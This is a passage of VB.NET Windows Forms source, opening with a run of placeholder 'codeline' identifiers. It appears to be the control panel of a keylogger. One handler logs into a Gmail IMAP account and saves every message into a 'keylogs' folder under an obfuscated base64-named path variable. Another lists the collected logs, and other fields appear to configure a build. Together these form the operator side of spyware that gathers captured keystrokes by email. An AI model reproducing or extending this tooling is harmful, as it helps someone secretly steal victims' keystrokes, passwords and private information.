codeline164, codeline165, codeline166, codeline167, codeline168, codeline169, codeline170, codeline171, codeline172, codeline173, codeline174, codeline175, codeline176, codeline177, codeline178, codeline179, codeline180, codeline181, codeline182, codeline183, codeline184, codeline185, codeline186, codeline187, codeline188, codeline189, codeline190, codeline191, codeline192, codeline193, codeline194, codeline195, codeline196, codeline197, codeline198, codeline199, codeline200, codeline201, codeline202, codeline203, codeline204, codeline205, codeline206, codeline207, codeline208, codeline209, codeline210, codeline211, codeline212, codeline213, codeline214, codeline215, codeline216, codeline217, codeline218, codeline219, codeline220, codeline221, codeline222, codeline223, codeline224, codeline225, codeline226, codeline227, codeline228, codeline229, codeline230, codeline231, codeline232, codeline233, codeline234, codeline235, codeline236, codeline237, codeline238, codeline239, codeline240, codeline241, codeline242, codeline243, codeline244, codeline245, codeline246, codeline247, codeline248, codeline249, codeline250, codeline251, codeline252, codeline253, codeline254, codeline255, codeline256, codeline257, codeline258, codeline259, codeline260, codeline261, codeline262, codeline263, codeline264, codeline265, codeline266, codeline267, codeline268, codeline269, codeline270, codeline271, codeline272, codeline273, codeline274, codeline275, codeline276, codeline277, codeline278, codeline279, codeline280, codeline281, codeline282, codeline283, codeline284}

        sCode = String.Join(vbNewLine, teststring)
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If ((TextBox1.Text = "" Or TextBox2.Text = "" Or TextBox3.Text = "") And CheckBox3.Checked = False) Or (TextBox4.Text = "" Or TextBox5.Text = "" Or TextBox6.Text = "" Or TextBox7.Text = "" Or TextBox8.Text = "" Or TextBox9.Text = "") Then
            MsgBox("Required Values not defined")

        Else
            Form2.Show()
        End If


    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged

        If CheckBox3.CheckState = CheckState.Checked Then
            TextBox1.Text = " Indefinite"
            TextBox2.Text = " 40"
            TextBox3.Text = " TEMP"
            TextBox1.Enabled = False
            TextBox2.Enabled = False
            TextBox3.Enabled = False

        ElseIf CheckBox3.CheckState = CheckState.Unchecked Then
            TextBox1.Enabled = True
            TextBox2.Enabled = True
            TextBox3.Enabled = True
            TextBox1.Text = ""
            TextBox2.Text = ""
            TextBox3.Text = ""
        End If


    End Sub



    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Form3.Show()
    End Sub


    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Form12.Show()
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Form1_Load(sender, e)

    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Form7.Show()

    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Form10.Show()
    End Sub

    Private Sub Button8_MouseHover(sender As Object, e As EventArgs) Handles Button8.MouseHover
        Button8.BackColor = Color.OrangeRed
    End Sub

    Private Sub Button8_MouseLeave(sender As Object, e As EventArgs) Handles Button8.MouseLeave
        Button8.BackColor = Color.Tomato
    End Sub


    Private Sub Button5_MouseHover(sender As Object, e As EventArgs) Handles Button5.MouseHover
        Button5.BackColor = Color.DodgerBlue
    End Sub

    Private Sub Button5_MouseLeave(sender As Object, e As EventArgs) Handles Button5.MouseLeave
        Button5.BackColor = Color.SteelBlue
    End Sub

    Private Sub Button4_MouseHover(sender As Object, e As EventArgs) Handles Button4.MouseHover
        Button4.BackColor = Color.Red
    End Sub

    Private Sub Button4_MouseLeave(sender As Object, e As EventArgs) Handles Button4.MouseLeave
        Button4.BackColor = Color.Maroon
    End Sub

    Private Sub Button6_MouseHover(sender As Object, e As EventArgs) Handles Button6.MouseHover
        Button6.BackColor = Color.Gray
        ToolTip1.Show("Refresh", Button6)

    End Sub

    Private Sub Button6_MouseLeave(sender As Object, e As EventArgs) Handles Button6.MouseLeave
        Button6.BackColor = Color.Black
    End Sub

    Private Sub Button7_MouseHover(sender As Object, e As EventArgs) Handles Button7.MouseHover
        Button7.BackColor = Color.Fuchsia
    End Sub

    Private Sub Button7_MouseLeave(sender As Object, e As EventArgs) Handles Button7.MouseLeave
        Button7.BackColor = Color.Orchid
    End Sub

    Private Sub Button3_MouseHover(sender As Object, e As EventArgs) Handles Button3.MouseHover
        Button3.BackColor = Color.Crimson
    End Sub

    Private Sub Button3_MouseLeave(sender As Object, e As EventArgs) Handles Button3.MouseLeave
        Button3.BackColor = Color.IndianRed
    End Sub

   
    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Form13.Show()

    End Sub

    Private Sub Button9_MouseHover(sender As Object, e As EventArgs) Handles Button9.MouseHover
        Button9.BackColor = Color.DarkSlateGray
    End Sub

    Private Sub Button9_MouseLeave(sender As Object, e As EventArgs) Handles Button9.MouseLeave
        Button9.BackColor = Color.Black
    End Sub

   
    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox4.Text = "" Or TextBox7.Text = "" Then
            MsgBox("Check mail settings, email or password missing!")
        Else

            ' Create a folder named "KeyLogs" under current directory
            ' to save the email retrieved.
            Dim curpath As String = dGVzdHBhdGg & "\Z33nie"
            Dim mailbox As String = [String].Format("{0}\keylogs", curpath)

            ' If the folder is not existed, create it.
            If Not Directory.Exists(mailbox) Then
                Directory.CreateDirectory(mailbox)
            End If


            ' Gmail IMAP server is "imap.gmail.com"
            Dim oServer As New MailServer("imap.gmail.com", _
                TextBox4.Text, TextBox7.Text, ServerProtocol.Imap4)
            Dim oClient As New MailClient("TryIt")

            ' Enable SSL connection
            oServer.SSLConnection = True

            ' Set IMAP4 SSL port
            oServer.Port = 993

            Try
                oClient.Connect(oServer)
                Dim infos As MailInfo() = oClient.GetMailInfos()
                For i As Integer = 0 To infos.Length - 1
                    Dim info As MailInfo = infos(i)
                    Console.WriteLine("Index: {0}; Size: {1}; UIDL: {2}", _
                            info.Index, info.Size, info.UIDL)

                    ' Receive email from Gmail server
                    Dim oMail As Mail = oClient.GetMail(info)

                    Console.WriteLine("From: {0}", oMail.From.ToString())
                    Console.WriteLine("Subject: {0}" & vbCr & vbLf, oMail.Subject)

                    ' Generate an email file name based on date time.
                    Dim d As System.DateTime = System.DateTime.Now
                    Dim cur As New System.Globalization.CultureInfo("en-US")
                    Dim sdate As String = d.ToString("yyyyMMddHHmmss", cur)
                    Dim fileName As String = [String].Format("{0}\{1}{2}{3}.eml", _
                         mailbox, sdate, d.Millisecond.ToString("d3"), i)

                    ' Save email to local disk
                    oMail.SaveAs(fileName, True)

                Next

                oClient.Quit()
            Catch ep As Exception
                Console.WriteLine(ep.Message)
            End Try

        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim filelist As String() = Directory.GetFiles(dGVzdHBhdGg & "\Z33nie\Keylogs")

        ListBox1.Items.AddRange(filelist)

    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Form18.Show()

    End Sub
End Class
